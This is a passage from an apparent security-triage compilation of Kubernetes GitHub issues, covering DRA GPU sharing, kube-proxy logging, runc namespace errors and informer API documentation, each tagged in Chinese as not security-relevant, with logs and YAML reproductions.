gpu-pod-gpu-claim-t9nnc   gpu.nvidia.com      WaitForFirstConsumer   pending              22s
gpu-sharing               gpu.nvidia.com      WaitForFirstConsumer   allocated,reserved   22s
```

```
root@k8s-master01:~/k8s-core-teaching/scheduler# kubectl get nas -n nvidia-dra -o yaml
apiVersion: v1
items:
- apiVersion: nas.gpu.resource.nvidia.com/v1alpha1
  kind: NodeAllocationState
  metadata:
    creationTimestamp: "2024-07-23T06:10:14Z"
    generation: 38
    name: k8s-worker01
    namespace: nvidia-dra
    ownerReferences:
    - apiVersion: v1
      kind: Node
      name: k8s-worker01
      uid: ad67a7ff-d69c-4a05-822f-328e22ff4c8b
    resourceVersion: "301074"
    uid: 6ab015af-df19-433c-b5ca-28c941f27215
  spec:
    allocatableDevices:
    - gpu:
        architecture: Turing
        brand: GeForce
        cudaComputeCapability: "7.5"
        index: 0
        memoryBytes: 4294967296
        migEnabled: false
        productName: NVIDIA GeForce GTX 1650 Ti
        uuid: GPU-14ac7620-6f64-1f3c-3196-610f63f6178a
    allocatedClaims:
      c9810bf9-a5fe-48fc-aedd-c930d8549def:
        claimInfo:
          name: gpu-sharing
          namespace: default
          uid: c9810bf9-a5fe-48fc-aedd-c930d8549def
        gpu:
          devices:
          - uuid: GPU-14ac7620-6f64-1f3c-3196-610f63f6178a
          sharing:
            strategy: TimeSlicing
    preparedClaims:
      c9810bf9-a5fe-48fc-aedd-c930d8549def:
        gpu:
          devices:
          - uuid: GPU-14ac7620-6f64-1f3c-3196-610f63f6178a
  status: Ready
kind: List
metadata:
  resourceVersion: ""
```

no error log


#### What did you expect to happen?

dynamic ok

#### How can we reproduce it (as minimally and precisely as possible)?

apply

```
---
apiVersion: resource.k8s.io/v1alpha2
kind: ResourceClaim
metadata:
  name: gpu-sharing
spec:
  resourceClassName: gpu.nvidia.com
  parametersRef:
    apiGroup: gpu.resource.nvidia.com
    kind: GpuClaimParameters
    name: gpu-ts-sharing
---
apiVersion: gpu.resource.nvidia.com/v1alpha1
kind: GpuClaimParameters
metadata:
  name: gpu-ts-sharing
spec:
  sharing:
    strategy: TimeSlicing
  count: 1
---
apiVersion: resource.k8s.io/v1alpha2
kind: ResourceClaimTemplate
metadata:
  name: gpu-claim-template
spec:
  spec:
    #allocationMode: Immediate
    resourceClassName: gpu.nvidia.com
---
apiVersion: v1
kind: Pod
metadata:
  name: gpu-pod
spec:
  schedulerName: default-scheduler
  containers:
  - name: gpu-container
    image: registry.cn-hangzhou.aliyuncs.com/hxpdocker/cuda:11.7.1-base-ubi8
    resources:
      claims:
        - name: gpu-claim
    command: ["/bin/sh", "-c"]
    args:
    - |
      nvidia-smi;
      sleep 1000000;
  resourceClaims:
    - name: gpu-claim
      source:
        #resourceClaimName: gpu-claim
        resourceClaimTemplateName: gpu-claim-template
---
apiVersion: v1
kind: Pod
metadata:
  name: gpu-pod2
spec:
  schedulerName: default-scheduler
  containers:
  - name: gpu-container
    image: registry.cn-hangzhou.aliyuncs.com/hxpdocker/cuda:11.7.1-base-ubi8
    resources:
      claims:
        - name: gpu-claim
    command: ["/bin/sh", "-c"]
    args:
    - |
      nvidia-smi;
      sleep 1000000;
  resourceClaims:
    - name: gpu-claim
      source:
        resourceClaimName: gpu-sharing
        #resourceClaimTemplateName: gpu-claim-template

```

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>
root@k8s-master01:~/k8s-core-teaching/scheduler# kubectl version
Client Version: v1.30.0
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.30.0

</details>


#### Cloud provider

<details>
pve 8
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

不涉及

---

## Issue #126314 E2eNode Suite.[It] [sig-node] Summary API [NodeConformance] when querying /stats/summary should report resource usage through the stats apiChanges

- Issue 链接：[#126314](https://github.com/kubernetes/kubernetes/issues/126314)

### Issue 内容

#### What happened?

Test is failing on crio conformance (cgroup v1 / cgroup v2)

#### What did you expect to happen?

Test doesn't fail.

#### How can we reproduce it (as minimally and precisely as possible)?

https://testgrid.k8s.io/sig-node-release-blocking#ci-crio-cgroupv1-node-e2e-conformance

You can reproduce it on a PR with 
/test pull-kubernetes-node-crio-e2e.

#### Anything else we need to know?

I reverted go bump and that was not the case.

#### Kubernetes version

master

#### Cloud provider

CI

#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

不涉及

---

## Issue #126285 dra nvidia k8s-dra-driver helm chart install with error

- Issue 链接：[#126285](https://github.com/kubernetes/kubernetes/issues/126285)

### Issue 内容

#### What happened?

W0723 09:36:00.907949       1 warnings.go:70] unknown field "spec.allocatableDevices[0].gpu.cudaDriverVersion"
W0723 09:36:00.907986       1 warnings.go:70] unknown field "spec.allocatableDevices[0].gpu.driverVersion"
I0723 09:36:00.922111       1 device_state.go:146] using devRoot=/driver-root
W0723 09:36:00.924825       1 warnings.go:70] unknown field "spec.allocatableDevices[0].gpu.cudaDriverVersion"
W0723 09:36:00.924835       1 warnings.go:70] unknown field "spec.allocatableDevices[0].gpu.driverVersion"
W0723 09:36:00.928266       1 warnings.go:70] unknown field "spec.allocatableDevices[0].gpu.cudaDriverVersion"
W0723 09:36:00.928278       1 warnings.go:70] unknown field "spec.allocatableDevices[0].gpu.driverVersion"

#### What did you expect to happen?

no error

#### How can we reproduce it (as minimally and precisely as possible)?

 kubectl logs -n nvidia-dra nvidia-dra-k8s-dra-driver-kubelet-plugin-zqrbw  

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>
root@k8s-master01:~/k8s-dra-driver#  kubectl version
Client Version: v1.30.0
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.30.0
</details>


#### Cloud provider

<details>
pve 8
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

不涉及

---

## Issue #126278 whether volume.kubernetes.io/selected-node problem is resolved?

- Issue 链接：[#126278](https://github.com/kubernetes/kubernetes/issues/126278)

### Issue 内容

#### What happened?

https://github.com/kubernetes/kubernetes/issues/100485  describe the problem
Although the ticket is closed, I see others comment that there still have problem....
So to double check whether this issue is resolved or not?
If yes, in which kube server version?

#### What did you expect to happen?



Please help list which server version resolve the issue.

#### How can we reproduce it (as minimally and precisely as possible)?

NA

#### Anything else we need to know?

_No response_

#### Kubernetes version

$ kubectl version
Client Version: v1.28.2
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.28.9-eks-036c24b

#### Cloud provider

<details>
AWS EKS
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

不涉及

---

## Issue #126271 Topology aware endpoint filtering logs too much.

- Issue 链接：[#126271](https://github.com/kubernetes/kubernetes/issues/126271)

### Issue 内容

#### What happened?

Since `ServiceTrafficDistribution` was promoted to beta and enabled by default https://github.com/kubernetes/kubernetes/pull/125838, v2 logs in kube-proxy are getting too aggressive logging the same message (see timestamps, this cluster has 10K services)
```
I0722 11:01:53.493532       1 topology.go:165] "Skipping topology aware endpoint filtering since node is missing label" label="topology.kubernetes.io/zone"
I0722 11:01:53.493604       1 topology.go:165] "Skipping topology aware endpoint filtering since node is missing label" label="topology.kubernetes.io/zone"
I0722 11:01:53.493677       1 topology.go:165] "Skipping topology aware endpoint filtering since node is missing label" label="topology.kubernetes.io/zone"
I0722 11:01:53.493744       1 topology.go:165] "Skipping topology aware endpoint filtering since node is missing label" label="topology.kubernetes.io/zone"
I0722 11:01:53.493808       1 topology.go:165] "Skipping topology aware endpoint filtering since node is missing label" label="topology.kubernetes.io/zone"
I0722 11:01:53.493886       1 topology.go:165] "Skipping topology aware endpoint filtering since node is missing label" label="topology.kubernetes.io/zone"
```

#### What did you expect to happen?

The amount of generated logs seems a but too much for v2 log level, and generally not quite helpful with the same message.

#### How can we reproduce it (as minimally and precisely as possible)?

Create kind cluster from master, watch kube-proxy logs.

#### Anything else we need to know?

There was an attempt to fix this https://github.com/kubernetes/kubernetes/pull/123322, and I think @danwinship was right https://github.com/kubernetes/kubernetes/pull/123322#issuecomment-1946606361.

#### Kubernetes version

master


#### Cloud provider

NONE


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

不涉及

---

## Issue #126252 Kube 1.30.2 wouldn't not start on CentOS9 - OCI runtime create failed: runc create failed: unable to create new parent process: namespace

- Issue 链接：[#126252](https://github.com/kubernetes/kubernetes/issues/126252)

### Issue 内容

#### What happened?

kubelet can't start containers:

```
Jul 20 19:47:48 server.local containerd[443986]: time="2024-07-20T19:47:48.975231965Z" level=info msg="RunPodSandbox for &PodSandboxMetadata{Name:kube-apiserver-server.local,Uid:8cf264a781ed44e362dd5c99bde47488,Namespace:kube-system,Attempt:489,}"
Jul 20 19:47:49 server.local containerd[443986]: time="2024-07-20T19:47:49.033257873Z" level=info msg="RunPodSandbox for &PodSandboxMetadata{Name:kube-apiserver-server.local,Uid:8cf264a781ed44e362dd5c99bde47488,Namespace:kube-system,Attempt:489,} returns sandbox id \"b60c47bc185b7fb9c0a4f8cf66740d8dc5fac91f20037d41716dd45f83aa8169\""
Jul 20 19:47:49 server.local kubelet[444942]: E0720 19:47:49.033794  444942 pod_workers.go:1298] "Error syncing pod, skipping" err="failed to \"StartContainer\" for \"kube-apiserver\" with CrashLoopBackOff: \"back-off 40s restarting failed container=kube-apiserver pod=kube-apiserver-server.local_kube-system(8cf264a781ed44e362dd5c99bde47488)\"" pod="kube-system/kube-apiserver-server.local" podUID="8cf264a781ed44e362dd5c99bde47488"
Jul 20 19:47:49 server.local containerd[443986]: time="2024-07-20T19:47:49.978487194Z" level=info msg="RunPodSandbox for &PodSandboxMetadata{Name:kube-apiserver-server.local,Uid:8cf264a781ed44e362dd5c99bde47488,Namespace:kube-system,Attempt:490,}"
Jul 20 19:47:50 server.local containerd[443986]: time="2024-07-20T19:47:50.036194614Z" level=info msg="RunPodSandbox for &PodSandboxMetadata{Name:kube-apiserver-server.local,Uid:8cf264a781ed44e362dd5c99bde47488,Namespace:kube-system,Attempt:490,} returns sandbox id \"2e3fae749de8778c361df08ae134e1659a1a9cb6a1e31d543e6b174f289f37b6\""
Jul 20 19:47:50 server.local kubelet[444942]: E0720 19:47:50.036866  444942 pod_workers.go:1298] "Error syncing pod, skipping" err="failed to \"StartContainer\" for \"kube-apiserver\" with CrashLoopBackOff: \"back-off 40s restarting failed container=kube-apiserver pod=kube-apiserver-server.local_kube-system(8cf264a781ed44e362dd5c99bde47488)\"" pod="kube-system/kube-apiserver-server.local" podUID="8cf264a781ed44e362dd5c99bde47488"
Jul 20 19:47:50 server.local containerd[443986]: time="2024-07-20T19:47:50.993405531Z" level=info msg="RunPodSandbox for &PodSandboxMetadata{Name:kube-apiserver-server.local,Uid:8cf264a781ed44e362dd5c99bde47488,Namespace:kube-system,Attempt:491,}"
Jul 20 19:47:51 server.local containerd[443986]: time="2024-07-20T19:47:51.051719785Z" level=info msg="RunPodSandbox for &PodSandboxMetadata{Name:kube-apiserver-server.local,Uid:8cf264a781ed44e362dd5c99bde47488,Namespace:kube-system,Attempt:491,} returns sandbox id \"55fc3cd3b28c827555706803b6092d9152bc7d4a517416696d7002a2e0ff0bd7\""
Jul 20 19:47:51 server.local kubelet[444942]: E0720 19:47:51.052269  444942 pod_workers.go:1298] "Error syncing pod, skipping" err="failed to \"StartContainer\" for \"kube-apiserver\" with CrashLoopBackOff: \"back-off 40s restarting failed container=kube-apiserver pod=kube-apiserver-server.local_kube-system(8cf264a781ed44e362dd5c99bde47488)\"" pod="kube-system/kube-apiserver-server.local" podUID="8cf264a781ed44e362dd5c99bde47488"
Jul 20 19:47:51 server.local containerd[443986]: time="2024-07-20T19:47:51.998681374Z" level=info msg="RunPodSandbox for &PodSandboxMetadata{Name:kube-apiserver-server.local,Uid:8cf264a781ed44e362dd5c99bde47488,Namespace:kube-system,Attempt:492,}"
Jul 20 19:47:52 server.local containerd[443986]: time="2024-07-20T19:47:52.055736204Z" level=info msg="RunPodSandbox for &PodSandboxMetadata{Name:kube-apiserver-server.local,Uid:8cf264a781ed44e362dd5c99bde47488,Namespace:kube-system,Attempt:492,} returns sandbox id \"d5b08e35431485135376a85c3df6cc4cdcb3994454752fff12517cbb5d7931ee\""
Jul 20 19:47:52 server.local kubelet[444942]: E0720 19:47:52.056351  444942 pod_workers.go:1298] "Error syncing pod, skipping" err="failed to \"StartContainer\" for \"kube-apiserver\" with CrashLoopBackOff: \"back-off 40s restarting failed container=kube-apiserver pod=kube-apiserver-server.local_kube-system(8cf264a781ed44e362dd5c99bde47488)\"" pod="kube-system/kube-apiserver-server.local" podUID="8cf264a781ed44e362dd5c99bde47488"
Jul 20 19:47:53 server.local containerd[443986]: time="2024-07-20T19:47:53.011560725Z" level=info msg="RunPodSandbox for &PodSandboxMetadata{Name:kube-apiserver-server.local,Uid:8cf264a781ed44e362dd5c99bde47488,Namespace:kube-system,Attempt:493,}"
Jul 20 19:47:53 server.local containerd[443986]: time="2024-07-20T19:47:53.069191418Z" level=info msg="RunPodSandbox for &PodSandboxMetadata{Name:kube-apiserver-server.local,Uid:8cf264a781ed44e362dd5c99bde47488,Namespace:kube-system,Attempt:493,} returns sandbox id \"6cbe87cb72705fd7b52838d91e3acf67ffff9270cbff9a8f6dab707e9cd74548\""
Jul 20 19:47:53 server.local kubelet[444942]: E0720 19:47:53.069734  444942 pod_workers.go:1298] "Error syncing pod, skipping" err="failed to \"StartContainer\" for \"kube-apiserver\" with CrashLoopBackOff: \"back-off 40s restarting failed container=kube-apiserver pod=kube-apiserver-server.local_kube-system(8cf264a781ed44e362dd5c99bde47488)\"" pod="kube-system/kube-apiserver-server.local" podUID="8cf264a781ed44e362dd5c99bde47488"
Jul 20 19:47:54 server.local containerd[443986]: time="2024-07-20T19:47:54.023642301Z" level=info msg="RunPodSandbox for &PodSandboxMetadata{Name:kube-apiserver-server.local,Uid:8cf264a781ed44e362dd5c99bde47488,Namespace:kube-system,Attempt:494,}"
Jul 20 19:47:54 server.local containerd[443986]: time="2024-07-20T19:47:54.082675718Z" level=info msg="RunPodSandbox for &PodSandboxMetadata{Name:kube-apiserver-server.local,Uid:8cf264a781ed44e362dd5c99bde47488,Namespace:kube-system,Attempt:494,} returns sandbox id \"70056a602d2b8939db02ace8da82754f5c172337c28d197e26532c494b647ce4\""
Jul 20 19:47:54 server.local kubelet[444942]: E0720 19:47:54.083319  444942 pod_workers.go:1298] "Error syncing pod, skipping" err="failed to \"StartContainer\" for \"kube-apiserver\" with CrashLoopBackOff: \"back-off 40s restarting failed container=kube-apiserver pod=kube-apiserver-server.local_kube-system(8cf264a781ed44e362dd5c99bde47488)\"" pod="kube-system/kube-apiserver-server.local" podUID="8cf264a781ed44e362dd5c99bde47488"
Jul 20 19:47:55 server.local containerd[443986]: time="2024-07-20T19:47:55.033032783Z" level=info msg="RunPodSandbox for &PodSandboxMetadata{Name:kube-apiserver-server.local,Uid:8cf264a781ed44e362dd5c99bde47488,Namespace:kube-system,Attempt:495,}"
Jul 20 19:47:55 server.local containerd[443986]: time="2024-07-20T19:47:55.091993276Z" level=info msg="RunPodSandbox for &PodSandboxMetadata{Name:kube-apiserver-server.local,Uid:8cf264a781ed44e362dd5c99bde47488,Namespace:kube-system,Attempt:495,} returns sandbox id \"04efc6234222bf42e5b16e42c10330369a31bf3041d28e42125cda3b05e84036\""
Jul 20 19:47:55 server.local kubelet[444942]: E0720 19:47:55.092697  444942 pod_workers.go:1298] "Error syncing pod, skipping" err="failed to \"StartContainer\" for \"kube-apiserver\" with CrashLoopBackOff: \"back-off 40s restarting failed container=kube-apiserver pod=kube-apiserver-server.local_kube-system(8cf264a781ed44e362dd5c99bde47488)\"" pod="kube-system/kube-apiserver-server.local" podUID="8cf264a781ed44e362dd5c99bde47488"
Jul 20 19:47:56 server.local containerd[443986]: time="2024-07-20T19:47:56.049457350Z" level=info msg="RunPodSandbox for &PodSandboxMetadata{Name:kube-apiserver-server.local,Uid:8cf264a781ed44e362dd5c99bde47488,Namespace:kube-system,Attempt:496,}"
Jul 20 19:47:56 server.local containerd[443986]: time="2024-07-20T19:47:56.107104384Z" level=info msg="RunPodSandbox for &PodSandboxMetadata{Name:kube-apiserver-server.local,Uid:8cf264a781ed44e362dd5c99bde47488,Namespace:kube-system,Attempt:496,} returns sandbox id \"28d655f473ea022bfdbe2b8669709d5b3942962107ff7444b0ac06ce27bce7b7\""
Jul 20 19:47:56 server.local kubelet[444942]: E0720 19:47:56.107756  444942 pod_workers.go:1298] "Error syncing pod, skipping" err="failed to \"StartContainer\" for \"kube-apiserver\" with CrashLoopBackOff: \"back-off 40s restarting failed container=kube-apiserver pod=kube-apiserver-server.local_kube-system(8cf264a781ed44e362dd5c99bde47488)\"" pod="kube-system/kube-apiserver-server.local" podUID="8cf264a781ed44e362dd5c99bde47488"
Jul 20 19:47:57 server.local containerd[443986]: time="2024-07-20T19:47:57.061814858Z" level=info msg="RunPodSandbox for &PodSandboxMetadata{Name:kube-apiserver-server.local,Uid:8cf264a781ed44e362dd5c99bde47488,Namespace:kube-system,Attempt:497,}"
Jul 20 19:47:57 server.local containerd[443986]: time="2024-07-20T19:47:57.119781364Z" level=info msg="RunPodSandbox for &PodSandboxMetadata{Name:kube-apiserver-server.local,Uid:8cf264a781ed44e362dd5c99bde47488,Namespace:kube-system,Attempt:497,} returns sandbox id \"8db734ca444e54511dd49142cbb506746b845a78eb8ec89c282e488d441d6105\""
Jul 20 19:47:57 server.local containerd[443986]: time="2024-07-20T19:47:57.121540223Z" level=info msg="CreateContainer within sandbox \"8db734ca444e54511dd49142cbb506746b845a78eb8ec89c282e488d441d6105\" for container &ContainerMetadata{Name:kube-apiserver,Attempt:48,}"
Jul 20 19:47:57 server.local containerd[443986]: time="2024-07-20T19:47:57.125286232Z" level=info msg="CreateContainer within sandbox \"8db734ca444e54511dd49142cbb506746b845a78eb8ec89c282e488d441d6105\" for &ContainerMetadata{Name:kube-apiserver,Attempt:48,} returns container id \"9c1caa7b3bfd9f3d97496a8bdd3ed702fa44046ce368510f615bf69b5d59ddfd\""
Jul 20 19:47:57 server.local kubelet[444942]: E0720 19:47:57.150237  444942 kuberuntime_manager.go:1256] container &Container{Name:kube-apiserver,Image:registry.k8s.io/kube-apiserver:v1.30.3,Command:[kube-apiserver --advertise-address=192.168.0.200 --allow-privileged=true --authorization-mode=Node,RBAC --client-ca-file=/etc/kubernetes/pki/ca.crt --cloud-provider=external --enable-admission-plugins=NodeRestriction --enable-bootstrap-token-auth=true --etcd-cafile=/etc/kubernetes/pki/etcd/ca.crt --etcd-certfile=/etc/kubernetes/pki/apiserver-etcd-client.crt --etcd-keyfile=/etc/kubernetes/pki/apiserver-etcd-client.key --etcd-servers=https://127.0.0.1:2379 --kubelet-client-certificate=/etc/kubernetes/pki/apiserver-kubelet-client.crt --kubelet-client-key=/etc/kubernetes/pki/apiserver-kubelet-client.key --kubelet-preferred-address-types=InternalIP,ExternalIP,Hostname --proxy-client-cert-file=/etc/kubernetes/pki/front-proxy-client.crt --proxy-client-key-file=/etc/kubernetes/pki/front-proxy-client.key --requestheader-allowed-names=front-proxy-client --requestheader-client-ca-file=/etc/kubernetes/pki/front-proxy-ca.crt --requestheader-extra-headers-prefix=X-Remote-Extra- --requestheader-group-headers=X-Remote-Group --requestheader-username-headers=X-Remote-User --secure-port=6443 --service-account-issuer=https://kubernetes.default.svc.cluster.local --service-account-key-file=/etc/kubernetes/pki/sa.pub --service-account-signing-key-file=/etc/kubernetes/pki/sa.key --service-cluster-ip-range=10.96.0.0/12 --tls-cert-file=/etc/kubernetes/pki/apiserver.crt --tls-private-key-file=/etc/kubernetes/pki/apiserver.key],Args:[],WorkingDir:,Ports:[]ContainerPort{},Env:[]EnvVar{},Resources:ResourceRequirements{Limits:ResourceList{},Requests:ResourceList{cpu: {{250 -3} {<nil>} 250m DecimalSI},},Claims:[]ResourceClaim{},},VolumeMounts:[]VolumeMount{VolumeMount{Name:ca-certs,ReadOnly:true,MountPath:/etc/ssl/certs,SubPath:,MountPropagation:nil,SubPathExpr:,RecursiveReadOnly:nil,},VolumeMount{Name:etc-pki,ReadOnly:true,MountPath:/etc/pki,SubPath:,MountPropagation:nil,SubPathExpr:,RecursiveReadOnly:nil,},VolumeMount{Name:k8s-certs,ReadOnly:true,MountPath:/etc/kubernetes/pki,SubPath:,MountPropagation:nil,SubPathExpr:,RecursiveReadOnly:nil,},},LivenessProbe:&Probe{ProbeHandler:ProbeHandler{Exec:nil,HTTPGet:&HTTPGetAction{Path:/livez,Port:{0 6443 },Host:192.168.0.200,Scheme:HTTPS,HTTPHeaders:[]HTTPHeader{},},TCPSocket:nil,GRPC:nil,},InitialDelaySeconds:10,TimeoutSeconds:15,PeriodSeconds:10,SuccessThreshold:1,FailureThreshold:8,TerminationGracePeriodSeconds:nil,},ReadinessProbe:&Probe{ProbeHandler:ProbeHandler{Exec:nil,HTTPGet:&HTTPGetAction{Path:/readyz,Port:{0 6443 },Host:192.168.0.200,Scheme:HTTPS,HTTPHeaders:[]HTTPHeader{},},TCPSocket:nil,GRPC:nil,},InitialDelaySeconds:0,TimeoutSeconds:15,PeriodSeconds:1,SuccessThreshold:1,FailureThreshold:3,TerminationGracePeriodSeconds:nil,},Lifecycle:nil,TerminationMessagePath:/dev/termination-log,ImagePullPolicy:IfNotPresent,SecurityContext:nil,Stdin:false,StdinOnce:false,TTY:false,EnvFrom:[]EnvFromSource{},TerminationMessagePolicy:File,VolumeDevices:[]VolumeDevice{},StartupProbe:&Probe{ProbeHandler:ProbeHandler{Exec:nil,HTTPGet:&HTTPGetAction{Path:/livez,Port:{0 6443 },Host:192.168.0.200,Scheme:HTTPS,HTTPHeaders:[]HTTPHeader{},},TCPSocket:nil,GRPC:nil,},InitialDelaySeconds:10,TimeoutSeconds:15,PeriodSeconds:10,SuccessThreshold:1,FailureThreshold:24,TerminationGracePeriodSeconds:nil,},ResizePolicy:[]ContainerResizePolicy{},RestartPolicy:nil,} start failed in pod kube-apiserver-server.local_kube-system(8cf264a781ed44e362dd5c99bde47488): RunContainerError: failed to create containerd task: failed to create shim task: OCI runtime create failed: runc create failed: unable to create new parent process: namespace path: lstat /proc/465574/ns/ipc: no such file or directory: unknown
Jul 20 19:47:57 server.local kubelet[444942]: E0720 19:47:57.150261  444942 pod_workers.go:1298] "Error syncing pod, skipping" err="failed to \"StartContainer\" for \"kube-apiserver\" with RunContainerError: \"failed to create containerd task: failed to create shim task: OCI runtime create failed: runc create failed: unable to create new parent process: namespace path: lstat /proc/465574/ns/ipc: no such file or directory: unknown\"" pod="kube-system/kube-apiserver-server.local" podUID="8cf264a781ed44e362dd5c99bde47488"
Jul 20 19:47:58 server.local containerd[443986]: time="2024-07-20T19:47:58.077149430Z" level=info msg="RunPodSandbox for &PodSandboxMetadata{Name:kube-apiserver-server.local,Uid:8cf264a781ed44e362dd5c99bde47488,Namespace:kube-system,Attempt:498,}"
Jul 20 19:47:58 server.local containerd[443986]: time="2024-07-20T19:47:58.133211916Z" level=info msg="RunPodSandbox for &PodSandboxMetadata{Name:kube-apiserver-server.local,Uid:8cf264a781ed44e362dd5c99bde47488,Namespace:kube-system,Attempt:498,} returns sandbox id \"5ec588c6c4263b36fb885d442b56b573d877ccdbe7ea8a3d5abb7eb4edb05508\""
Jul 20 19:47:58 server.local kubelet[444942]: E0720 19:47:58.133855  444942 pod_workers.go:1298] "Error syncing pod, skipping" err="failed to \"StartContainer\" for \"kube-apiserver\" with CrashLoopBackOff: \"back-off 1m20s restarting failed container=kube-apiserver pod=kube-apiserver-server.local_kube-system(8cf264a781ed44e362dd5c99bde47488)\"" pod="kube-system/kube-apiserver-server.local" podUID="8cf264a781ed44e362dd5c99bde47488"
Jul 20 19:47:59 server.local containerd[443986]: time="2024-07-20T19:47:59.090391639Z" level=info msg="RunPodSandbox for &PodSandboxMetadata{Name:kube-apiserver-server.local,Uid:8cf264a781ed44e362dd5c99bde47488,Namespace:kube-system,Attempt:499,}"
Jul 20 19:47:59 server.local containerd[443986]: time="2024-07-20T19:47:59.150015122Z" level=info msg="RunPodSandbox for &PodSandboxMetadata{Name:kube-apiserver-server.local,Uid:8cf264a781ed44e362dd5c99bde47488,Namespace:kube-system,Attempt:499,} returns sandbox id \"5aad307e0bf599f55a836368fa8df911d2dce3a075ebca5bc1538afc1f695ace\""
Jul 20 19:47:59 server.local kubelet[444942]: E0720 19:47:59.150732  444942 pod_workers.go:1298] "Error syncing pod, skipping" err="failed to \"StartContainer\" for \"kube-apiserver\" with CrashLoopBackOff: \"back-off 1m20s restarting failed container=kube-apiserver pod=kube-apiserver-server.local_kube-system(8cf264a781ed44e362dd5c99bde47488)\"" pod="kube-system/kube-apiserver-server.local" podUID="8cf264a781ed44e362dd5c99bde47488"
Jul 20 19:48:00 server.local containerd[443986]: time="2024-07-20T19:48:00.112128645Z" level=info msg="RunPodSandbox for &PodSandboxMetadata{Name:kube-apiserver-server.local,Uid:8cf264a781ed44e362dd5c99bde47488,Namespace:kube-system,Attempt:500,}"
Jul 20 19:48:00 server.local containerd[443986]: time="2024-07-20T19:48:00.168565075Z" level=info msg="RunPodSandbox for &PodSandboxMetadata{Name:kube-apiserver-server.local,Uid:8cf264a781ed44e362dd5c99bde47488,Namespace:kube-system,Attempt:500,} returns sandbox id \"0a38845c4d1f230fff10786dd49710aaecae7309f2f4e498c6924b20467ce2d7\""
Jul 20 19:48:00 server.local kubelet[444942]: E0720 19:48:00.169178  444942 pod_workers.go:1298] "Error syncing pod, skipping" err="failed to \"StartContainer\" for \"kube-apiserver\" with CrashLoopBackOff: \"back-off 1m20s restarting failed container=kube-apiserver pod=kube-apiserver-server.local_kube-system(8cf264a781ed44e362dd5c99bde47488)\"" pod="kube-system/kube-apiserver-server.local" podUID="8cf264a781ed44e362dd5c99bde47488"
```

#### What did you expect to happen?

Kubelete able to start conatiners

#### How can we reproduce it (as minimally and precisely as possible)?

```
---
apiServer:
  extraArgs:
    cloud-provider: external
apiVersion: kubeadm.k8s.io/v1beta3
clusterName: cluster
controlPlaneEndpoint: 192.168.0.200:6443
controllerManager:
  extraArgs:
    allocate-node-cidrs: "false"
    cloud-provider: external
etcd:
  local:
    dataDir: ""
kind: ClusterConfiguration
kubernetesVersion: v1.30.3
networking:
  podSubnet: 192.168.0.0/16
scheduler: {}
---
apiVersion: kubeadm.k8s.io/v1beta3
kind: InitConfiguration
localAPIEndpoint: {}
nodeRegistration:
  imagePullPolicy: IfNotPresent
  kubeletExtraArgs:
    cloud-provider: external
  taints: null
```

#### Anything else we need to know?

Config applied on the host:
```
setenforce 0
sed -i 's/^SELINUX=enforcing$/SELINUX=disabled/' /etc/selinux/config
modprobe overlay
modprobe br_netfilter
cat <<EOF | sudo tee /etc/sysctl.d/99-kubernetes-cri.conf
net.bridge.bridge-nf-call-iptables = 1
net.ipv4.ip_forward = 1
net.bridge.bridge-nf-call-ip6tables = 1
EOF
sysctl --system
sed -i 's/SystemdCgroup = false$/SystemdCgroup = true/' /etc/containerd/config.toml
systemctl restart containerd
systemctl enable containerd
```

#### Kubernetes version

1.30.2


#### Cloud provider

on-prem

#### OS version

centos9 stream

#### Install tools

kubeadm

#### Container runtime (CRI) and version (if applicable)

containerd 1.7.19

#### Related plugins (CNI, CSI, ...) and versions (if applicable)

n/a

### 分析结果

不涉及

---

## Issue #126235 No explanation of error returned from SharedInformer.AddEventHandler

- Issue 链接：[#126235](https://github.com/kubernetes/kubernetes/issues/126235)

### Issue 内容

#### What happened?

When reviewing controller code that reacts to an `error` from `SharedInformer.AddEventHandler`, I found myself unsure whether the code I was looking at is correct. The comments do not explain why the `AddEventHandler` method of `SharedInformer` can return an `error`. No mention of what errors can appear, what such an appearance would mean. The caller gets no clue about how to react to an error.

#### What did you expect to happen?

I expected the interface to give enough information to write/evaluate calls to this method.

#### How can we reproduce it (as minimally and precisely as possible)?

Look at the interface (e.g., https://github.com/kubernetes/client-go/blob/v0.26.0/tools/cache/shared_informer.go#L135-L140).

#### Anything else we need to know?

Nope

#### Kubernetes version

<details>

The `error` return has been there since release 1.26.0.

</details>


#### Cloud provider

<details>
N/A
</details>


#### OS version

<details>
N/A
</details>


#### Install tools

<details>
N/A
</details>


